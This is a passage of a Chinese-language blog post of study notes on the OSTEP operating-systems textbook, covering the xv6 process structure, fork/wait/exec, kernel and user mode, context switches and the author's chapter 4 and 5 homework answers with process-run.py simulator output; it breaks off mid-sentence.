class="hljs-title">context</span> &#123;</span><br><span class="hljs-keyword">int</span> eip;<br><span class="hljs-keyword">int</span> esp;<br><span class="hljs-keyword">int</span> ebx;<br><span class="hljs-keyword">int</span> ecx;<br><span class="hljs-keyword">int</span> edx;<br><span class="hljs-keyword">int</span> esi;<br><span class="hljs-keyword">int</span> edi;<br><span class="hljs-keyword">int</span> ebp;<br>&#125;;<br><br><br><span class="hljs-comment">// the different states a process can be in</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">proc_state</span> &#123;</span> UNUSED, EMBRYO, SLEEPING,<br>RUNNABLE, RUNNING, ZOMBIE &#125;;<br><br><br><span class="hljs-comment">// the information xv6 tracks about each process</span><br><span class="hljs-comment">// including its register context and state</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br><span class="hljs-keyword">char</span> *mem; <span class="hljs-comment">// Start of process memory</span><br>uint sz; <span class="hljs-comment">// Size of process memory</span><br><span class="hljs-keyword">char</span> *kstack; <span class="hljs-comment">// Bottom of kernel stack</span><br><span class="hljs-comment">// for this process</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">proc_state</span> <span class="hljs-title">state</span>;</span> <span class="hljs-comment">// Process state</span><br><span class="hljs-keyword">int</span> pid; <span class="hljs-comment">// Process ID</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span> <span class="hljs-comment">// Parent process</span><br><span class="hljs-keyword">void</span> *chan; <span class="hljs-comment">// If non-zero, sleeping on chan</span><br><span class="hljs-keyword">int</span> killed; <span class="hljs-comment">// If non-zero, have been killed</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span> <span class="hljs-comment">// Open files</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span> <span class="hljs-comment">// Current directory</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span> <span class="hljs-comment">// Switch here to run process</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span>;</span> <span class="hljs-comment">// Trap frame for the</span><br><span class="hljs-comment">// current interrupt</span><br>&#125;;<br><br></code></pre></td></tr></table></figure><h1 id="进程API"><a href="#进程API" class="headerlink" title="进程API"></a>进程API</h1><h2 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h2><ul><li>fork函数执行后，后将存在两个进程，且每个进程都会从 fork()的返回处继续执行</li><li>新的子进程几近于对父进程的翻版：子进程获得父进程的栈、数据段、堆和执行文本段的拷贝</li><li>执行 fork()之后，每个进程均可修改各自的栈数据、以及堆段中的变量，而并不影响另一进程</li><li>父进程的fork返回值为子进程的pid，子进程的fork返回值为0<h2 id="wait"><a href="#wait" class="headerlink" title="wait"></a>wait</h2>父子进程的前后顺序是不固定的，如果父进程想要等待子进程结束之后再进行某种操作，父进程可以先调用 wait()，该系统调用会在子进程运行结束后才返回，从而延迟自己的执行，直到子进程执行完毕</li></ul><h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><p>fork+exec可以让子进程执行与父进程不同的程序。给我可执行程序的名称以及需要的参数后，exec()会从可执行程序中加载代码和静态数据，并用它覆写自己的代码段（以及静态数据），堆、栈及其他内存空间也会被重新初始化。然后操作系统就执行该程序，将参数通过 argv 传递给该进程</p><p><img src="https://img-blog.csdnimg.cn/9ba130a0de0146db90b3050a63bb95e9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h1 id="CPU虚拟化与进程"><a href="#CPU虚拟化与进程" class="headerlink" title="CPU虚拟化与进程"></a>CPU虚拟化与进程</h1><p>一些目标：</p><ul><li>如何提供有许多 CPU 的假象，使得让我们感觉同时有许多进程同时运行？</li><li>性能：如何在不增加系统开销的情况下实现虚拟化？</li><li>控制权：如何有效地运行进程，同时保留对 CPU 的控制？</li></ul><p>运行进程的一个简化的方式：</p><p>操作系统：</p><ul><li>在进程列表上创建条目</li><li>为程序分配内存，并将程序加载到内存中</li><li>根据 argc/argv 设置程序栈</li><li>清除寄存器</li><li>执行 call main() 方法</li></ul><p>进程：</p><ul><li>执行main开始的代码</li><li>return</li></ul><p>操作系统：</p><ul><li>释放进程内存</li><li>从进程列表中移除进程</li></ul><p>但是这种方式存在一些问题：</p><ul><li>操作系统怎么能确保程序不做一些受限操作，如向磁盘发出 I/O 请求或获得更多系统资源（如 CPU 或内存）？<ul><li>进程必须能够执行 I/O 和其他一些受限制的操作，但又不能让进程完全控制系统</li></ul></li><li>当我们运行一个进程时，操作系统如何让它停下来并切换到另一个进程，从而实现虚拟化 CPU 所需的时分共享？</li></ul><p>通过区分内核模式和用户模式，操作系统可以提供受保护的控制权转移：</p><blockquote><p>在用户模式（user mode）下，应用程序不能完全访问硬件资源。在内核模式（kernel mode）下，操作系统可以访问机器的全部资源。还提供了陷入（trap）内核和从陷阱返回（return-from-trap）到用户模式程序的特别说明，以及一些指令，让操作系统告诉硬件陷阱表（trap table）在内存中的位置 </p></blockquote><p>进程不可以不受约束的做所有它想做的事情，那么如果用户希望执行某种特权操作怎么办？</p><p>答案是内核小心地向用户程序暴露某些关键功能（通过提供几百个系统调用），如访问文件系统、创建和销毁进程、与其他进程通信，以及分配更多内存</p><p>要执行系统调用，程序必须执行特殊的陷阱（trap）指令。该指令同时跳入内核并将特权级别提升到内核模式。一旦进入内核，系统就可以执行任何需要的特权操作，完成后，操作系统调用一个特殊的从陷阱返回（return-from-trap）指令，该指令返回到发起调用的用户程序中，同时将特权级别降低，回到用户模式。为了保证在操作系统发出从陷阱返回指令时能够正确返回，必须确保存储足够的调用者寄存器。例如，在 x86 上，处理器会将程序计数器、标志和其他一些寄存器推送到每个进程的内核栈（kernel stack）上</p><p>因此，在上面运行进程的基础上，需要加以下操作：</p><ul><li>内核栈相关操作</li><li>trap与return-from-trap</li><li>中断处理程序</li></ul><h1 id="进程的上下文切换（context-switch）"><a href="#进程的上下文切换（context-switch）" class="headerlink" title="进程的上下文切换（context switch）"></a>进程的上下文切换（context switch）</h1><ul><li>进程上下文切换概念：操作系统要为当前正在执行的进程保存一些寄存器的值（例如，到它的内核栈），并为即将执行的进程恢复一些寄存器的值（从它的内核栈）</li><li>为了完成进程上下文切换，操作系统会执行一些底层汇编代码，来保存通用寄存器、程序计数器，以及当前正在运行的进程的内核栈指针，然后恢复寄存器、程序计数器，并切换内核栈，供即将运行的进程使用</li></ul><p><img src="/image/ostep/Snipaste_2022-09-18_20-01-40.png"></p><h1 id="chapter-4-HW"><a href="#chapter-4-HW" class="headerlink" title="chapter 4 HW"></a>chapter 4 HW</h1><p>1</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs tap">$ ./process-run.py -l 5:100,5:100   <br><br><br><br>Time        PID:<span class="hljs-number"> 0 </span>       PID:<span class="hljs-number"> 1 </span>          CPU           IOs<br> <span class="hljs-number"> 1 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 2 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 3 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 4 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 5 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 6 </span>          DONE       RUN:cpu             1<br> <span class="hljs-number"> 7 </span>          DONE       RUN:cpu             1<br> <span class="hljs-number"> 8 </span>          DONE       RUN:cpu             1<br> <span class="hljs-number"> 9 </span>          DONE       RUN:cpu             1<br><span class="hljs-number"> 10 </span>          DONE       RUN:cpu             1<br><br>Stats: Total Time 10<br>Stats: CPU Busy<span class="hljs-number"> 10 </span>(100.00%)<br>Stats: IO Busy <span class="hljs-number"> 0 </span>(0.00%)<br><br><br><span class="hljs-comment"># 5:100表示一个程序由5条指令组成，每条指令是 CPU 指令的几率是100%</span><br></code></pre></td></tr></table></figure><p>2、3</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Time</span>        PID: <span class="hljs-number">0</span>        PID: <span class="hljs-number">1</span>           CPU           IOs<br>  <span class="hljs-attribute">1</span>        RUN:cpu         READY             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">2</span>        RUN:cpu         READY             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">3</span>        RUN:cpu         READY             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">4</span>        RUN:cpu         READY             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">5</span>           DONE        RUN:io             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">6</span>           DONE       WAITING                           <span class="hljs-number">1</span><br>  <span class="hljs-attribute">7</span>           DONE       WAITING                           <span class="hljs-number">1</span><br>  <span class="hljs-attribute">8</span>           DONE       WAITING                           <span class="hljs-number">1</span><br>  <span class="hljs-attribute">9</span>           DONE       WAITING                           <span class="hljs-number">1</span><br> <span class="hljs-attribute">10</span>           DONE       WAITING                           <span class="hljs-number">1</span><br> <span class="hljs-attribute">11</span>*          DONE   RUN:io_done             <span class="hljs-number">1</span><br><br><span class="hljs-attribute">Stats</span>: Total Time <span class="hljs-number">11</span><br><span class="hljs-attribute">Stats</span>: CPU Busy <span class="hljs-number">6</span> (<span class="hljs-number">54</span>.<span class="hljs-number">55</span>%)<br><span class="hljs-attribute">Stats</span>: IO Busy  <span class="hljs-number">5</span> (<span class="hljs-number">45</span>.<span class="hljs-number">45</span>%)<br></code></pre></td></tr></table></figure><p>4</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs tap">Time        PID:<span class="hljs-number"> 0 </span>       PID:<span class="hljs-number"> 1 </span>          CPU           IOs<br> <span class="hljs-number"> 1 </span>        RUN:io         READY             1<br> <span class="hljs-number"> 2 </span>       WAITING       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br> <span class="hljs-number"> 3 </span>       WAITING       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br> <span class="hljs-number"> 4 </span>       WAITING       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br> <span class="hljs-number"> 5 </span>       WAITING       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br> <span class="hljs-number"> 6 </span>       WAITING          DONE                           1<br>  7*   RUN:io_done          DONE             1<br><br>Stats: Total Time 7<br>Stats: CPU Busy<span class="hljs-number"> 6 </span>(85.71%)<br>Stats: IO Busy <span class="hljs-number"> 5 </span>(71.43%)<br><br><br>Time        PID:<span class="hljs-number"> 0 </span>       PID:<span class="hljs-number"> 1 </span>          CPU           IOs<br> <span class="hljs-number"> 1 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 2 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 3 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 4 </span>       RUN:cpu         READY             1<br> <span class="hljs-number"> 5 </span>          DONE        RUN:io             1<br> <span class="hljs-number"> 6 </span>          DONE       WAITING                           1<br> <span class="hljs-number"> 7 </span>          DONE       WAITING                           1<br> <span class="hljs-number"> 8 </span>          DONE       WAITING                           1<br> <span class="hljs-number"> 9 </span>          DONE       WAITING                           1<br><span class="hljs-number"> 10 </span>          DONE       WAITING                           1<br> 11*          DONE   RUN:io_done             1<br><br>Stats: Total Time 11<br>Stats: CPU Busy<span class="hljs-number"> 6 </span>(54.55%)<br>Stats: IO Busy <span class="hljs-number"> 5 </span>(45.45%)<br><br>一个重要的标志是-S，它决定了当进程发出 I/O 时系统如何反应。将标志设置为 SWITCH_ON_END，在进程进行 I/O 操作时，系统将不会切换到另一个进程，而是等待进程完成。<br></code></pre></td></tr></table></figure><p>5</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Time</span>        PID: <span class="hljs-number">0</span>        PID: <span class="hljs-number">1</span>           CPU           IOs<br>  <span class="hljs-attribute">1</span>         RUN:io         READY             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">2</span>        WAITING       RUN:cpu             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">3</span>        WAITING       RUN:cpu             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">4</span>        WAITING       RUN:cpu             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">5</span>        WAITING       RUN:cpu             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-attribute">6</span>        WAITING          DONE                           <span class="hljs-number">1</span><br>  <span class="hljs-attribute">7</span>*   RUN:io_done          DONE             <span class="hljs-number">1</span><br><br><span class="hljs-attribute">Stats</span>: Total Time <span class="hljs-number">7</span><br><span class="hljs-attribute">Stats</span>: CPU Busy <span class="hljs-number">6</span> (<span class="hljs-number">85</span>.<span class="hljs-number">71</span>%)<br><span class="hljs-attribute">Stats</span>: IO Busy  <span class="hljs-number">5</span> (<span class="hljs-number">71</span>.<span class="hljs-number">43</span>%)<br></code></pre></td></tr></table></figure><p>6</p><figure class="highlight ruleslanguage"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs ruleslanguage">$ ./process-run.py -l <span class="hljs-number">3</span>:<span class="hljs-number">0</span>,<span class="hljs-number">5</span>:<span class="hljs-number">100</span>,<span class="hljs-number">5</span>:<span class="hljs-number">100</span>,<span class="hljs-number">5</span>:<span class="hljs-number">100</span> -S SWITCH_ON_IO -I IO_RUN_LATER -c -p<br><br>Time        PID: <span class="hljs-number">0</span>        PID: <span class="hljs-number">1</span>        PID: <span class="hljs-number">2</span>        PID: <span class="hljs-number">3</span>           CPU           IOs<br>  <span class="hljs-number">1</span>         RUN:io         READY         READY         READY             <span class="hljs-number">1</span><br>  <span class="hljs-number">2</span>        WAITING       RUN:cpu         READY         READY             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-number">3</span>        WAITING       RUN:cpu         READY         READY             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-number">4</span>        WAITING       RUN:cpu         READY         READY             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-number">5</span>        WAITING       RUN:cpu         READY         READY             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-number">6</span>        WAITING       RUN:cpu         READY         READY             <span class="hljs-number">1</span>             <span class="hljs-number">1</span><br>  <span class="hljs-number">7</span>*         READY          <span class="hljs-keyword">DONE</span>       RUN:cpu         READY             <span class="hljs-number">1</span><br>  <span class="hljs-number">8</span>          READY          <span class="hljs-keyword">DONE</span>       RUN:cpu         READY             <span class="hljs-number">1</span><br>  <span class="hljs-number">9</span>          READY          <span class="hljs-keyword">DONE</span>       RUN:cpu         READY             <span class="hljs-number">1</span><br> <span class="hljs-number">10</span>          READY          <span class="hljs-keyword">DONE</span>       RUN:cpu         READY             <span class="hljs-number">1</span><br> <span class="hljs-number">11</span>          READY          <span class="hljs-keyword">DONE</span>       RUN:cpu         READY             <span class="hljs-number">1</span><br> <span class="hljs-number">12</span>          READY          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>       RUN:cpu             <span class="hljs-number">1</span><br> <span class="hljs-number">13</span>          READY          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>       RUN:cpu             <span class="hljs-number">1</span><br> <span class="hljs-number">14</span>          READY          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>       RUN:cpu             <span class="hljs-number">1</span><br> <span class="hljs-number">15</span>          READY          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>       RUN:cpu             <span class="hljs-number">1</span><br> <span class="hljs-number">16</span>          READY          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>       RUN:cpu             <span class="hljs-number">1</span><br> <span class="hljs-number">17</span>    RUN:io_done          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>             <span class="hljs-number">1</span><br> <span class="hljs-number">18</span>         RUN:io          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>             <span class="hljs-number">1</span><br> <span class="hljs-number">19</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">20</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">21</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">22</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">23</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">24</span>*   RUN:io_done          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>             <span class="hljs-number">1</span><br> <span class="hljs-number">25</span>         RUN:io          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>             <span class="hljs-number">1</span><br> <span class="hljs-number">26</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">27</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">28</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">29</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">30</span>        WAITING          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>                           <span class="hljs-number">1</span><br> <span class="hljs-number">31</span>*   RUN:io_done          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>          <span class="hljs-keyword">DONE</span>             <span class="hljs-number">1</span><br><br>Stats: Total Time <span class="hljs-number">31</span><br>Stats: CPU Busy <span class="hljs-number">21</span> (<span class="hljs-number">67.74</span>%)<br>Stats: IO Busy  <span class="hljs-number">15</span> (<span class="hljs-number">48.39</span>%)<br><br><br>IO_RUN_LATER选项使得当 I/O 完成时，发出它的进程不一定马上运行，当时正在运行的进程一直运行；<br><br>使用-I IO_RUN_IMMEDIATE 设置，该设置立即运行发出I/O的进程<br><br>这种方式会让IO程序等待，IO程序如果优先使用CPU，当IO程序被阻塞的时候，其他进程被CPU调度，这种情况下的CPU利用率更高。<br></code></pre></td></tr></table></figure><p>7</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs tap">./process-run.py -l 3:0,5:100,5:100,5:100 -S SWITCH_ON_IO -I IO_RUN_IMMEDIATE -c -p<br>Time        PID:<span class="hljs-number"> 0 </span>       PID:<span class="hljs-number"> 1 </span>       PID:<span class="hljs-number"> 2 </span>       PID:<span class="hljs-number"> 3 </span>          CPU           IOs<br> <span class="hljs-number"> 1 </span>        RUN:io         READY         READY         READY             1<br> <span class="hljs-number"> 2 </span>       WAITING       RUN:cpu         READY         READY            <span class="hljs-number"> 1 </span>            1<br> <span class="hljs-number"> 3 </span>       WAITING       RUN:cpu         READY         READY            <span class="hljs-number"> 1 </span>            1<br> <span class="hljs-number"> 4 </span>       WAITING       RUN:cpu         READY         READY            <span class="hljs-number"> 1 </span>            1<br> <span class="hljs-number"> 5 </span>       WAITING       RUN:cpu         READY         READY            <span class="hljs-number"> 1 </span>            1<br> <span class="hljs-number"> 6 </span>       WAITING       RUN:cpu         READY         READY            <span class="hljs-number"> 1 </span>            1<br>  7*   RUN:io_done          DONE         READY         READY             1<br> <span class="hljs-number"> 8 </span>        RUN:io          DONE         READY         READY             1<br> <span class="hljs-number"> 9 </span>       WAITING          DONE       RUN:cpu         READY            <span class="hljs-number"> 1 </span>            1<br><span class="hljs-number"> 10 </span>       WAITING          DONE       RUN:cpu         READY            <span class="hljs-number"> 1 </span>            1<br><span class="hljs-number"> 11 </span>       WAITING          DONE       RUN:cpu         READY            <span class="hljs-number"> 1 </span>            1<br><span class="hljs-number"> 12 </span>       WAITING          DONE       RUN:cpu         READY            <span class="hljs-number"> 1 </span>            1<br><span class="hljs-number"> 13 </span>       WAITING          DONE       RUN:cpu         READY            <span class="hljs-number"> 1 </span>            1<br> 14*   RUN:io_done          DONE          DONE         READY             1<br><span class="hljs-number"> 15 </span>        RUN:io          DONE          DONE         READY             1<br><span class="hljs-number"> 16 </span>       WAITING          DONE          DONE       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br><span class="hljs-number"> 17 </span>       WAITING          DONE          DONE       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br><span class="hljs-number"> 18 </span>       WAITING          DONE          DONE       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br><span class="hljs-number"> 19 </span>       WAITING          DONE          DONE       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br><span class="hljs-number"> 20 </span>       WAITING          DONE          DONE       RUN:cpu            <span class="hljs-number"> 1 </span>            1<br> 21*   RUN:io_done          DONE          DONE          DONE             1<br><br>Stats: Total Time 21<br>Stats: CPU Busy<span class="hljs-number"> 21 </span>(100.00%)<br>Stats: IO Busy <span class="hljs-number"> 15 </span>(71.43%)<br><br><br></code></pre></td></tr></table></figure><h1 id="chapter-5-HW"><a href="#chapter-5-HW" class="headerlink" title="chapter 5 HW"></a>chapter 5 HW</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>父子进程的变量的值是独立的，一个进程对变量的修改并不会影响另一个变量的相同名字的值</p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>父子进程具有相同的文件偏移量</p><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>fork之后父子进程的执行顺序是不固定的，但是vfork可以实现题意目的，vfork会使子进程先执行</p><blockquote><p>vfork() differs from fork(2) in that the calling thread is suspended until  the  child  terminates<br>       (either  normally,  by  calling  _exit(2), or abnormally, after delivery of a fatal signal), or it<br>       makes a call to execve(2).</p></blockquote><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>函数原型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs cpp">SYNOPSIS<br>       <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br>       <span class="hljs-keyword">extern</span> <span class="hljs-keyword">char</span> **environ;<br><br>       <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execl</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pathname, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *arg, ...</span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-comment">/* (char  *) NULL */</span>)</span></span>;<br>       <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execlp</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *file, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *arg, ...</span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-comment">/* (char  *) NULL */</span>)</span></span>;<br>       <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execle</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pathname, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *arg, ...</span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-comment">/*, (char *) NULL, char *const envp[] */</span>)</span></span>;<br>       <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execv</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *pathname, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[])</span></span>;<br>       <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execvp</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *file, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[])</span></span>;<br>       <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">execvpe</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *file, <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> argv[],</span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-keyword">char</span> *<span class="hljs-keyword">const</span> envp[])</span></span>;<br></code></pre></td></tr></table></figure><p>引自<a href="https://stackoverflow.com/questions/5769734/what-are-the-different-versions-of-exec-used-for-in-c-and-c/5769803#5769803%EF%BC%9A">https://stackoverflow.com/questions/5769734/what-are-the-different-versions-of-exec-used-for-in-c-and-c/5769803#5769803：</a></p><p>The 